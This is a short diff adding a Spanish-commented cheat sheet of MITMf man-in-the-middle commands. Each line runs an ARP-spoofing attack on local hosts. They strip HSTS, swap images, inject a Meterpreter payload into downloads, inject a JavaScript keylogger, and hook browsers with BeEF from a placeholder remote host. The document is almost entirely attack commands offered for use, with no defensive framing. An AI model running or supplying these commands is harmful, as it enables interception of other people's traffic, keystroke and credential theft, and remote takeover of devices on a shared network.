@@ -1,0 +1,8 @@
+
+ sudo python mitmf.py -i wlan0 --spoof --arp --target 192.168.1.104 --gateway 192.168.1.1  # ARP spoofing con interceptacion de contendido 
+ sudo python mitmf.py -i wlan0 --spoof --arp --hsts --gateway 192.168.1.1 --target 192.168.1.101 --imgrand --img-dir /home/pi/Shuriken/Tools/ShSw/imgs/ninja.jpg # remplazar magenes
+	     mitmf --spoof --arp -i wlan0 --gateway 10.0.2.1 --target 10.0.2.15 --filepwn # injectar meterpreter payload, iniciar handler metasploit
+			* Nota adicional , modificar mitmf.config host meterpreter en FilePwn section
+ sudo python mitmf.py -i wlan0 --spoof --arp --hsts --gateway 192.168.1.1 --target 192.168.1.101 -jskeylogger # inject keylogger
+
+ sudo python mitmf.py -i wlan0 --spoof --arp --hsts --gateway 192.168.1.1 --target 192.168.1.101 --inject --js-url http://Remote-IP:3081/hook.js # Hook with BEEF
